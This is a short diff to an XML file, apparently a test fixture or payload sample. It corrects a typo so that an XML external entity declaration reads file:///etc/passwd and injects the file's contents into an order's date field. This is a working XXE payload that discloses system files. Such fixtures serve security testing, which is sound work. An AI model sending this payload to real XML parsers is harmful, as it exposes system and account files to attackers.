@@ -1,5 +1,5 @@
-<?xml version="1.0" encoding="windows-1252"?>
-<!DOCTYPE order [<!ENTITY xxe SYSTEM "file:///ect/passwd">]>
+<?xml version="1.0" encoding="windows-1252"?>
+<!DOCTYPE order [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
 <order>
 	<date>&xxe;</date>
 </order>
